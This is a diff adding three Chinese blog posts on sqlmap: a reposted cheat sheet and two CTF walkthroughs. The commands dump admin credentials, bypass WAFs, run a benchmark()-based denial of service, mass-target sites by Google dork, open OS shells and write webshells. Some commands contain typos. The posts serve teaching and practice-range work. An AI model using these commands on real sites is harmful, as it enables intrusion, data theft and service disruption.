@@ -336,6 +336,873 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://wrgiun.github.io/2019/03/03/sqlmap2/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="wr">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="giun">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                
+                <a href="/2019/03/03/sqlmap2/" class="post-title-link" itemprop="url">sqlmap常见的11种方法</a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+
+            
+            
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+
+              
+                
+              
+
+              <time title="创建时间：2019-03-03 21:48:21 / 修改时间：22:02:28" itemprop="dateCreated datePublished" datetime="2019-03-03T21:48:21+08:00">2019-03-03</time>
+            
+
+            
+              
+
+              
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/sqlmap/" itemprop="url" rel="index"><span itemprop="name">sqlmap</span></a></span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <p>本文转载<a href="https://www.cnblogs.com/ichunqiu/p/5805108.html这篇文章" target="_blank" rel="noopener">https://www.cnblogs.com/ichunqiu/p/5805108.html这篇文章</a><br>一共有11种常见SQLmap使用方法：</p>
+<p>一、SQLMAP用于Access数据库注入</p>
+<p>(1) 猜解是否能注入<br>1<br>2</p>
+<pre><code>win: python sqlmap.py -u &quot;http://www.xxx.com/en/CompHonorBig.asp?id=7&quot;
+Linux : .lmap.py -u &quot;http://www.xxx.com/en/CompHonorBig.asp?id=7&quot;
+</code></pre><p>(2) 猜解表</p>
+<p>1<br>2</p>
+<pre><code>win: python sqlmap.py -u &quot;http://www.xxx.com/en/CompHonorBig.asp?id=7&quot; --tables
+Linux: .lmap.py -u &quot;http://www.xxx.com/en/CompHonorBig.asp?id=7&quot; --tables
+</code></pre><p>(3) 根据猜解的表进行猜解表的字段(假如通过2得到了admin这个表)</p>
+<p>1<br>2</p>
+<pre><code>win: python sqlmap.py -u &quot;http://www.xxx.com/en/CompHonorBig.asp?id=7&quot; --columns -T admin
+Linux: .lmap.py -u &quot;http://www.xxx.com/en/CompHonorBig.asp?id=7&quot; --columns -T admin
+</code></pre><p>(4) 根据字段猜解内容(假如通过3得到字段为username和password)</p>
+<p>1<br>2<br>3</p>
+<pre><code>win: python sqlmap.py -u &quot;http://www.xxx.com/en/CompHonorBig.asp?id=7&quot; --dump -T admin -C &quot;username,password&quot;
+Linux: .lmap.py -u &quot;http://www.xxx.com/en/CompHonorBig.asp?id=7&quot; --dump -T admin -C
+&quot;username,[url=]B[/url]password&quot;
+</code></pre><p>二、SQLMAP用于Cookie注入</p>
+<p>(1) cookie注入，猜解表</p>
+<p>1</p>
+<pre><code>win : python sqlmap.py -u &quot;http://www.xxx.org/jsj/shownews.asp&quot; --cookie &quot;id=31&quot; --table --level 2
+</code></pre><p>(2) 猜解字段，(通过1的表猜解字段，假如表为admin)</p>
+<p>1<br>2</p>
+<pre><code>win :python sqlmap.py -u &quot;http://www.xxx.org/jsj/shownews.asp&quot; --cookie &quot;id=31&quot; --columns -T
+admin --level 2
+</code></pre><p>(3) 猜解内容</p>
+<p>1<br>2</p>
+<pre><code>win :python sqlmap.py -u &quot;http://www.xxx.org/jsj/shownews.asp&quot; --cookie &quot;id=31&quot; --dump -T
+admin -C &quot;username,password&quot; --level 2
+</code></pre><p>三、SQLMAP用于mysql中DDOS攻击(1) 获取一个Shell</p>
+<p>1<br>2<br>3<br>4</p>
+<pre><code>win:
+python sqlmap.py -u [url]http://192.168.159.1/news.php?id=1[/url] --sql-shell
+Linux:
+sqlmap -u [url]http://192.168.159.1/news.php?id=1[/url] --sql-shell
+</code></pre><p>(2) 输入执行语句完成DDOS攻击</p>
+<p>1</p>
+<pre><code>select benchmark(99999999999,0x70726f62616e646f70726f62616e646f70726f62616e646f)
+</code></pre><p>四、SQLMAP用于mysql注入</p>
+<p>(1) 查找数据库</p>
+<p>1</p>
+<pre><code>python sqlmap.py -u &quot;http://www.xxx.com/link.php?id=321&quot; --dbs
+</code></pre><p>(2) 通过第一步的数据库查找表(假如数据库名为dataname)</p>
+<p>1</p>
+<pre><code>python sqlmap.py -u &quot;http://www.xxx.com/link.php?id=321&quot; -D dataname --tables
+</code></pre><p>(3) 通过2中的表得出列名(假如表为table_name)</p>
+<p>1</p>
+<pre><code>python sqlmap.py -u &quot;http://www.xxx.com/link.php?id=321&quot; -D dataname -T table_name --columns
+</code></pre><p>(4) 获取字段的值(假如扫描出id,user,password字段)</p>
+<p>1<br>2</p>
+<pre><code>python sqlmap.py -u &quot;http://www.xxx.com/link.php?id=321&quot; -D dataname -T table_name -C
+&quot;id,user,password&quot; --dump
+</code></pre><p>五、SQLMAP中post登陆框注入</p>
+<p>(1) 其中的search-test.txt是通过抓包工具burp suite抓到的包并把数据保存为这个txt文件<br>我们在使用Sqlmap进行post型注入时，经常会出现请求遗漏导致注入失败的情况。这里分享一个小技巧，即结合burpsuite来使用sqlmap，用这种方法进行post注入测试会更准确，操作起来也非常容易。</p>
+<ol>
+<li>浏览器打开目标地址http:// <a href="http://www.xxx.com" target="_blank" rel="noopener">www.xxx.com</a> /Login.asp</li>
+</ol>
+<ol start="2">
+<li>配置burp代理(127.0.0.1:8080)以拦截请求</li>
+</ol>
+<ol start="3">
+<li>点击login表单的submit按钮</li>
+</ol>
+<ol start="4">
+<li>这时候Burp会拦截到了我们的登录POST请求</li>
+</ol>
+<ol start="5">
+<li>把这个post请求复制为txt, 我这命名为search-test.txt 然后把它放至sqlmap目录下</li>
+</ol>
+<ol start="6">
+<li>运行sqlmap并使用如下命令：</li>
+</ol>
+<p>1<br>./sqlmap.py -r search-test.txt -p tfUPass</p>
+<p>这里参数-r 是让sqlmap加载我们的post请求rsearch-test.txt，而-p 大家应该比较熟悉，指定注入用的参数。</p>
+<p>注入点：<a href="http://testasp.vulnweb.com/Login.asp" target="_blank" rel="noopener">http://testasp.vulnweb.com/Login.asp</a></p>
+<p>几种注入方式：./sqlmap.py -r search-test.txt -p tfUPass</p>
+<p>(2) 自动的搜索</p>
+<p>1<br>sqlmap -u [url]<a href="http://testasp.vulnweb.com/Login.asp[/url]" target="_blank" rel="noopener">http://testasp.vulnweb.com/Login.asp[/url]</a> –forms</p>
+<p>(3) 指定参数搜索</p>
+<p>1<br>sqlmap -u [url]<a href="http://testasp.vulnweb.com/Login.asp[/url]" target="_blank" rel="noopener">http://testasp.vulnweb.com/Login.asp[/url]</a> –data “tfUName=321&amp;tfUPass=321”</p>
+<p>六、SQLMAP中Google搜索注入</p>
+<p>inurl后面的语言是由自己定的</p>
+<p>注入过程中如果选y是注入，如果不是选n</p>
+<p>1<br>sqlmap -g inurl:php?id=</p>
+<p>七、SQLMAP中的请求延迟<br>参数 –delay –safe-freq</p>
+<p>1<br>2<br>python sqlmap.py –dbs -u “<a href="http://xxx.cn/index.php/Index/view/id/40.html&quot;" target="_blank" rel="noopener">http://xxx.cn/index.php/Index/view/id/40.html&quot;</a> –delay 1<br>python sqlmap.py –dbs -u “<a href="http://xxx.cn/index.php/Index/view/id/40.html&quot;" target="_blank" rel="noopener">http://xxx.cn/index.php/Index/view/id/40.html&quot;</a> –safe-freq 3</p>
+<p>参数</p>
+<p>八、SQLMAP绕过WAF防火墙<br>注入点:<a href="http://192.168.159.1/news.php?id=1" target="_blank" rel="noopener">http://192.168.159.1/news.php?id=1</a></p>
+<p>1<br>sqlmap -u [url]<a href="http://192.168.159.1/news.php?id=1[/url]" target="_blank" rel="noopener">http://192.168.159.1/news.php?id=1[/url]</a> -v 3 –dbs –batch –tamper “space2morehash.py”</p>
+<p>space2morehash.py中可以替换space2hash.py或者base64encode.py或者charencode.py</p>
+<p>都是编码方式</p>
+<p>space2hash.py base64encode.py charencode.py</p>
+<p>九、SQLMAP查看权限</p>
+<p>1<br>sqlmap -u [url]<a href="http://192.168.159.1/news.php?id=1[/url]" target="_blank" rel="noopener">http://192.168.159.1/news.php?id=1[/url]</a> –privileges</p>
+<p>十、SQLMAP伪静态注入(1) 查找数据库</p>
+<p>1<br>python sqlmap.py -u “<a href="http://xxx.cn/index.php/Index/view/id/40.html&quot;" target="_blank" rel="noopener">http://xxx.cn/index.php/Index/view/id/40.html&quot;</a> –dbs</p>
+<p>(2) 通过1中的数据库查找对应的表 (假如通过1，得到的是dataname)</p>
+<p>1<br>python sqlmap.py -u “<a href="http://xxx.cn/index.php/Index/view/id/40.html&quot;" target="_blank" rel="noopener">http://xxx.cn/index.php/Index/view/id/40.html&quot;</a> -D dataname –tables</p>
+<p>(3) 通过2中的数据表得到字段(假如得到的是tablename表)</p>
+<p>1<br>2<br>python sqlmap.py -u “<a href="http://xxx.cn/index.php/Index/view/id/40.html&quot;" target="_blank" rel="noopener">http://xxx.cn/index.php/Index/view/id/40.html&quot;</a> -D dataname -T<br>tablename –columns</p>
+<p>(4) 通过3得到字段值(假如从3中得到字段id，password)</p>
+<p>1<br>2<br>python sqlmap.py -u “<a href="http://xxx.cn/index.php/Index/view/id/40.html&quot;" target="_blank" rel="noopener">http://xxx.cn/index.php/Index/view/id/40.html&quot;</a> -D dataname -T<br>tablename -C “password” –dump</p>
+<p>十一、SQLMAP注入点执行命令与交互写shell </p>
+<p>(1) 注入点：<a href="http://192.168.159.1/news.php?id=1" target="_blank" rel="noopener">http://192.168.159.1/news.php?id=1</a></p>
+<p>此处采用的是Linux系统</p>
+<p>1<br>sqlmap -u [url]<a href="http://192.168.159.1/news.php?id=1[/url]" target="_blank" rel="noopener">http://192.168.159.1/news.php?id=1[/url]</a> –os-cmd=ipconfig</p>
+<p>出现语言的选择根据实际的测试网站选择语言</p>
+<p>指定目标站点D:/www/ </p>
+<p>(2) 获取Shell</p>
+<p>1<br>sqlmap -u [url]<a href="http://192.168.159.1/news.php?id=1[/url]" target="_blank" rel="noopener">http://192.168.159.1/news.php?id=1[/url]</a> –os-shell</p>
+<p>出现语言的选择根据实际的测试网站选择语言</p>
+<p>指定目标站点D:/www/</p>
+<p>输入ipconfig/all</p>
+<p>创建用户和删除用户</p>
+<p>只要权限足够大，你可以输入使用任何命令。</p>
+<p>其他命令参考下面：</p>
+<p>从数据库中搜索字段</p>
+<p>1<br>sqlmap -r “c:\tools\request.txt” –dbms mysql -D dedecms –search -C admin,password</p>
+<p>在dedecms数据库中搜索字段admin或者password。</p>
+<p>读取与写入文件</p>
+<p>首先找需要网站的物理路径，其次需要有可写或可读权限。</p>
+<p>–file-read=RFILE 从后端的数据库管理系统文件系统读取文件 （物理路径）</p>
+<p>–file-write=WFILE 编辑后端的数据库管理系统文件系统上的本地文件 （mssql xp_shell）</p>
+<p>–file-dest=DFILE 后端的数据库管理系统写入文件的绝对路径</p>
+<p>#示例：</p>
+<p>1<br>sqlmap -r “c:\request.txt” -p id –dbms mysql –file-dest “e:\php\htdocs\dvwa\inc\include\1.php” –file-write “f:\webshell\1112.php”</p>
+<p>使用shell命令：</p>
+<p>1<br>sqlmap -r “c:\tools\request.txt” -p id –dms mysql –os-shell</p>
+<p>接下来指定网站可写目录：</p>
+<p>“E:\php\htdocs\dvwa”</p>
+<p>#注：mysql不支持列目录，仅支持读取单个文件。sqlserver可以列目录，不能读写文件，但需要一个（xp_dirtree函数）</p>
+<p>sqlmap详细命令：</p>
+<p>-is-dba 当前用户权限（是否为root权限）</p>
+<p>-dbs 所有数据库</p>
+<p>-current-db 网站当前数据库</p>
+<p>-users 所有数据库用户</p>
+<p>-current-user 当前数据库用户</p>
+<p>-random-agent 构造随机user-agent</p>
+<p>-passwords 数据库密码</p>
+<p>-proxy <a href="http://local:8080" target="_blank" rel="noopener">http://local:8080</a> –threads 10 (可以自定义线程加速) 代理</p>
+<p>-time-sec=TIMESEC DBMS响应的延迟时间（默认为5秒）</p>
+<p>Options（选项）：<br>-version 显示程序的版本号并退出<br>-h, –help 显示此帮助消息并退出<br>-v VERBOSE 详细级别：0-6（默认为1）</p>
+<p>Target（目标）：</p>
+<p>以下至少需要设置其中一个选项，设置目标URL。</p>
+<p>-d DIRECT 直接连接到数据库。<br>-u URL, –url=URL 目标URL。<br>-l LIST 从Burp或WebScarab代理的日志中解析目标。<br>-r REQUESTFILE 从一个文件中载入HTTP请求。<br>-g GOOGLEDORK 处理Google dork的结果作为目标URL。<br>-c CONFIGFILE 从INI配置文件中加载选项。</p>
+<p>Request（请求）：</p>
+<p>这些选项可以用来指定如何连接到目标URL。</p>
+<p>-data=DATA 通过POST发送的数据字符串<br>-cookie=COOKIE HTTP Cookie头<br>-cookie-urlencode URL 编码生成的cookie注入<br>-drop-set-cookie 忽略响应的Set – Cookie头信息<br>-user-agent=AGENT 指定 HTTP User – Agent头<br>-random-agent 使用随机选定的HTTP User – Agent头<br>-referer=REFERER 指定 HTTP Referer头<br>-headers=HEADERS 换行分开，加入其他的HTTP头<br>-auth-type=ATYPE HTTP身份验证类型（基本，摘要或NTLM）(Basic, Digest or NTLM)<br>-auth-cred=ACRED HTTP身份验证凭据（用户名:密码）<br>-auth-cert=ACERT HTTP认证证书（key_file，cert_file）<br>-proxy=PROXY 使用HTTP代理连接到目标URL<br>-proxy-cred=PCRED HTTP代理身份验证凭据（用户名：密码）<br>-ignore-proxy 忽略系统默认的HTTP代理<br>-delay=DELAY 在每个HTTP请求之间的延迟时间，单位为秒<br>-timeout=TIMEOUT 等待连接超时的时间（默认为30秒）<br>-retries=RETRIES 连接超时后重新连接的时间（默认3）<br>-scope=SCOPE 从所提供的代理日志中过滤器目标的正则表达式<br>-safe-url=SAFURL 在测试过程中经常访问的url地址<br>-safe-freq=SAFREQ 两次访问之间测试请求，给出安全的URL</p>
+<p>Enumeration（枚举）：<br>这些选项可以用来列举后端数据库管理系统的信息、表中的结构和数据。此外，您还可以运行您自己的SQL语句。</p>
+<p>-b, –banner 检索数据库管理系统的标识<br>-current-user 检索数据库管理系统当前用户<br>-current-db 检索数据库管理系统当前数据库<br>-is-dba 检测DBMS当前用户是否DBA<br>-users 枚举数据库管理系统用户<br>-passwords 枚举数据库管理系统用户密码哈希<br>-privileges 枚举数据库管理系统用户的权限<br>-roles 枚举数据库管理系统用户的角色<br>-dbs 枚举数据库管理系统数据库<br>-D DBname 要进行枚举的指定数据库名<br>-T TBLname 要进行枚举的指定数据库表（如：-T tablename –columns）<br>-tables 枚举的DBMS数据库中的表<br>-columns 枚举DBMS数据库表列<br>-dump 转储数据库管理系统的数据库中的表项<br>-dump-all 转储所有的DBMS数据库表中的条目<br>-search 搜索列（S），表（S）和/或数据库名称（S）<br>-C COL 要进行枚举的数据库列<br>-U USER 用来进行枚举的数据库用户<br>-exclude-sysdbs 枚举表时排除系统数据库<br>-start=LIMITSTART 第一个查询输出进入检索<br>-stop=LIMITSTOP 最后查询的输出进入检索<br>-first=FIRSTCHAR 第一个查询输出字的字符检索<br>-last=LASTCHAR 最后查询的输出字字符检索<br>-sql-query=QUERY 要执行的SQL语句<br>-sql-shell 提示交互式SQL的shell</p>
+<p>Optimization（优化）：<br>这些选项可用于优化SqlMap的性能。</p>
+<p>-o 开启所有优化开关<br>–predict-output 预测常见的查询输出<br>–keep-alive 使用持久的HTTP（S）连接<br>–null-connection 从没有实际的HTTP响应体中检索页面长度<br>–threads=THREADS 最大的HTTP（S）请求并发量（默认为1）</p>
+<p>Injection（注入）：<br>这些选项可以用来指定测试哪些参数， 提供自定义的注入payloads和可选篡改脚本。</p>
+<p>-p TESTPARAMETER 可测试的参数（S）<br>–dbms=DBMS 强制后端的DBMS为此值<br>–os=OS 强制后端的DBMS操作系统为这个值<br>–prefix=PREFIX 注入payload字符串前缀<br>–suffix=SUFFIX 注入payload字符串后缀<br>–tamper=TAMPER 使用给定的脚本（S）篡改注入数据</p>
+<p>Detection（检测）：<br>这些选项可以用来指定在SQL盲注时如何解析和比较HTTP响应页面的内容。</p>
+<p>–level=LEVEL 执行测试的等级（1-5，默认为1）<br>–risk=RISK 执行测试的风险（0-3，默认为1）<br>–string=STRING 查询时有效时在页面匹配字符串<br>–regexp=REGEXP 查询时有效时在页面匹配正则表达式<br>–text-only 仅基于在文本内容比较网页</p>
+<p>Techniques（技巧）：<br>这些选项可用于调整具体的SQL注入测试。</p>
+<p>–technique=TECH SQL注入技术测试（默认BEUST）<br>–time-sec=TIMESEC DBMS响应的延迟时间（默认为5秒）<br>–union-cols=UCOLS 定列范围用于测试UNION查询注入<br>–union-char=UCHAR 用于暴力猜解列数的字符</p>
+<p>Fingerprint（指纹）：<br>-f, –fingerprint 执行检查广泛的DBMS版本指纹</p>
+<p>Brute force（蛮力）：<br>这些选项可以被用来运行蛮力检查。</p>
+<p>–common-tables 检查存在共同表</p>
+<p>–common-columns 检查存在共同列</p>
+<p>User-defined function injection（用户自定义函数注入）：</p>
+<p>这些选项可以用来创建用户自定义函数。</p>
+<p>–udf-inject 注入用户自定义函数</p>
+<p>–shared-lib=SHLIB 共享库的本地路径</p>
+<p>File system access（访问文件系统）：<br>这些选项可以被用来访问后端数据库管理系统的底层文件系统。</p>
+<p>–file-read=RFILE 从后端的数据库管理系统文件系统读取文件<br>–file-write=WFILE 编辑后端的数据库管理系统文件系统上的本地文件<br>–file-dest=DFILE 后端的数据库管理系统写入文件的绝对路径</p>
+<p>Operating system access（操作系统访问）：<br>这些选项可以用于访问后端数据库管理系统的底层操作系统。</p>
+<p>–os-cmd=OSCMD 执行操作系统命令<br>–os-shell 交互式的操作系统的shell<br>–os-pwn 获取一个OOB shell，meterpreter或VNC<br>–os-smbrelay 一键获取一个OOB shell，meterpreter或VNC<br>–os-bof 存储过程缓冲区溢出利用<br>–priv-esc 数据库进程用户权限提升<br>–msf-path=MSFPATH Metasploit Framework本地的安装路径<br>–tmp-path=TMPPATH 远程临时文件目录的绝对路径</p>
+<p>Windows注册表访问：<br>这些选项可以被用来访问后端数据库管理系统Windows注册表。</p>
+<p>–reg-read 读一个Windows注册表项值<br>–reg-add 写一个Windows注册表项值数据<br>–reg-del 删除Windows注册表键值<br>–reg-key=REGKEY Windows注册表键<br>–reg-value=REGVAL Windows注册表项值<br>–reg-data=REGDATA Windows注册表键值数据<br>–reg-type=REGTYPE Windows注册表项值类型<br>这些选项可以用来设置一些一般的工作参数。<br>-t TRAFFICFILE 记录所有HTTP流量到一个文本文件中<br>-s SESSIONFILE 保存和恢复检索会话文件的所有数据<br>–flush-session 刷新当前目标的会话文件<br>–fresh-queries 忽略在会话文件中存储的查询结果<br>–eta 显示每个输出的预计到达时间<br>–update 更新SqlMap<br>–save file保存选项到INI配置文件<br>–batch 从不询问用户输入，使用所有默认配置。</p>
+<p>Miscellaneous（杂项）：<br>–beep 发现SQL注入时提醒<br>–check-payload IDS对注入payloads的检测测试<br>–cleanup SqlMap具体的UDF和表清理DBMS<br>–forms 对目标URL的解析和测试形式<br>–gpage=GOOGLEPAGE 从指定的页码使用谷歌dork结果<br>–page-rank Google dork结果显示网页排名（PR）<br>–parse-errors 从响应页面解析数据库管理系统的错误消息<br>–replicate 复制转储的数据到一个sqlite3数据库<br>–tor 使用默认的Tor（Vidalia/ Privoxy/ Polipo）代理地址<br>–wizard 给初级用户的简单向导界面</p>
+<p>相关链接：<a href="http://bbs.ichunqiu.com/thread-10583-1-1.html" target="_blank" rel="noopener">http://bbs.ichunqiu.com/thread-10583-1-1.html</a></p>
+
+          
+        
+      
+    </div>
+
+    
+
+    
+    
+    
+
+    
+
+    
+      
+    
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://wrgiun.github.io/2019/03/03/sqlmap1/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="wr">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="giun">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                
+                <a href="/2019/03/03/sqlmap1/" class="post-title-link" itemprop="url">sqlmap之cookie注入（靶场第二题）</a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+
+            
+            
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+
+              
+                
+              
+
+              <time title="创建时间：2019-03-03 21:42:52 / 修改时间：22:02:08" itemprop="dateCreated datePublished" datetime="2019-03-03T21:42:52+08:00">2019-03-03</time>
+            
+
+            
+              
+
+              
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/sqlmap/" itemprop="url" rel="index"><span itemprop="name">sqlmap</span></a></span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <p>sqlmap<br>靶场第二题：<a href="https://hack.zkaq.org/?a=battle&amp;f=target&amp;id=31ac789a52edf9bb" target="_blank" rel="noopener">https://hack.zkaq.org/?a=battle&amp;f=target&amp;id=31ac789a52edf9bb</a><br>首先我们尝试下sql注入</p>
+<pre><code>http://120.203.13.75:8001/shownews.asp?id=171%20and%201=1
+</code></pre><p><img src="/2019/03/03/sqlmap1/1.jpg" alt="在这里插入图片描述"><br>说明该网站有防sql注入。那么我们使用cookie注入</p>
+<pre><code>http://120.203.13.75:8001/shownews.asp?id=171%20order%20by%2010
+</code></pre><p><img src="/2019/03/03/sqlmap1/2.jpg" alt="在这里插入图片描述"><br><strong>第一步</strong><br><strong>猜解表</strong></p>
+<pre><code>sqlmap -u &quot;http://120.203.13.75:8001/shownews.asp?&quot; --cookie &quot;id=171&quot; --table --level 2
+</code></pre><p><img src="/2019/03/03/sqlmap1/3.jpg" alt="在这里插入图片描述"><br><strong>第二步，猜字段</strong></p>
+<pre><code>sqlmap -u &quot;http://120.203.13.75:8001/shownews.asp?&quot; --cookie &quot;id=171&quot; --column -T admin --level 2
+</code></pre><p><img src="/2019/03/03/sqlmap1/4.jpg" alt="在这里插入图片描述"><br><strong>第三步，爆数据</strong></p>
+<pre><code>sqlmap -u &quot;http://120.203.13.75:8001/shownews.asp?&quot; --cookie &quot;id=171&quot;  --dump  -T admin -C &quot;username,password&quot; --level 2
+</code></pre><p><img src="/2019/03/03/sqlmap1/5.jpg" alt="在这里插入图片描述"><br>b9a2a2b5dffb918c,该密码是md5加密，百度搜索md5在线加密<br><img src="/2019/03/03/sqlmap1/6.jpg" alt="在这里插入图片描述"><br>我们已经拿到密码了<br>进入后台网站,利用御剑工作扫出后台<br><img src="/2019/03/03/sqlmap1/7.jpg" alt="在这里插入图片描述"><br><strong><a href="http://120.203.13.75:8001/admin" target="_blank" rel="noopener">http://120.203.13.75:8001/admin</a></strong><br>输入账号admin,密码welcome获取flag<br><img src="/2019/03/03/sqlmap1/8.jpg" alt="在这里插入图片描述"></p>
+
+          
+        
+      
+    </div>
+
+    
+
+    
+    
+    
+
+    
+
+    
+      
+    
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://wrgiun.github.io/2019/03/03/sqlmap0/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="wr">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="giun">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                
+                <a href="/2019/03/03/sqlmap0/" class="post-title-link" itemprop="url">sqlmap安装与使用（实验吧第3题）</a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+
+            
+            
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+
+              
+                
+              
+
+              <time title="创建时间：2019-03-03 21:33:58 / 修改时间：22:01:57" itemprop="dateCreated datePublished" datetime="2019-03-03T21:33:58+08:00">2019-03-03</time>
+            
+
+            
+              
+
+              
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/sqlmap/" itemprop="url" rel="index"><span itemprop="name">sqlmap</span></a></span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <p>使用的环境是Ubuntu系统<br><img src="/2019/03/03/sqlmap0/77.jpg" alt="在这里插入图片描述"></p>
+<h2 id="sqlmap的安装"><a href="#sqlmap的安装" class="headerlink" title="sqlmap的安装"></a>sqlmap的安装</h2><p>sqlmap需要安装python2环境,python3不行(Ubuntu下默认安装python2)<br>输入命令：<code>sudo apt sqlamp</code><br>检查是否安装成功<br>输入命令：<code>sqlmap -help</code>返回下面结果即为成功。<br><img src="/2019/03/03/sqlmap0/66.jpg" alt="在这里插入图片描述"></p>
+<h2 id="sqlmap基本参数"><a href="#sqlmap基本参数" class="headerlink" title="sqlmap基本参数"></a>sqlmap基本参数</h2><p>sqlmap -h 查看帮助选项<br>is -dba 当前用户权限<br>dbs 所有数据库<br>current-db 网站当前数据库<br>users 所有数据库用户<br>current-user 当前数据库用户<br>tables 参数：列表名<br>columns  参数：字段名<br>dump 参数：下载数据</p>
+<h2 id="sqlmap牛刀小试"><a href="#sqlmap牛刀小试" class="headerlink" title="sqlmap牛刀小试"></a>sqlmap牛刀小试</h2><p>我们以这到题为例<a href="http://www.shiyanbar.com/ctf/33。" target="_blank" rel="noopener">http://www.shiyanbar.com/ctf/33。</a><br>如果没有注册过实验吧的朋友先注册下实验吧<br>拿到题目我们判断下有没有sql注入</p>
+<pre><code>在url后面加上and 1=1,没有报错
+加上and 1=2，报错。
+说明有sql注入
+</code></pre><p><img src="/2019/03/03/sqlmap0/55.jpg" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/201903022017271.png" alt="在这里插入图片描述"><br><strong>第一步使用sqlmap查看数据库信息</strong><br>输入命令：<code>sqlmap -u &quot;http://ctf5.shiyanbar.com/8/index.php?id=1&quot; --current-db</code><br><img src="/2019/03/03/sqlmap0/44.jpg" alt="在这里插入图片描述"><br>经过一些时间成功爆出当前数据库为my_db,如果注入过程提示选择y或者n，一般是选择y。大概就是尝试更多的方法进行注入<br><strong>第二步、爆出表名</strong><br>输入命令：<code>sqlmap -u &quot;http://ctf5.shiyanbar.com/8/index.php?id=1&quot; -D my_db --tables</code></p>
+<p><img src="/2019/03/03/sqlmap0/33.jpg" alt="在这里插入图片描述"><br><strong>第三步爆字段名</strong><br>输入命令：</p>
+<pre><code>sqlmap -u &quot;http://ctf5.shiyanbar.com/8/index.php?id=1&quot; -D my_db -T thiskey --columnsy
+</code></pre><p><img src="/2019/03/03/sqlmap0/11.jpg" alt="在这里插入图片描述"><br><strong>第四步、爆数据</strong><br>输入命令：</p>
+<pre><code>sqlmap -u &quot;http://ctf5.shiyanbar.com/8/index.php?id=1&quot; -D my_db -T thiskey -C k0y --dump
+</code></pre><p>稍等片刻，成功找到flag：<code>whatiMyD91dump</code><br><img src="/2019/03/03/sqlmap0/22.jpg" alt="在这里插入图片描述"></p>
+
+          
+        
+      
+    </div>
+
+    
+
+    
+    
+    
+
+    
+
+    
+      
+    
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
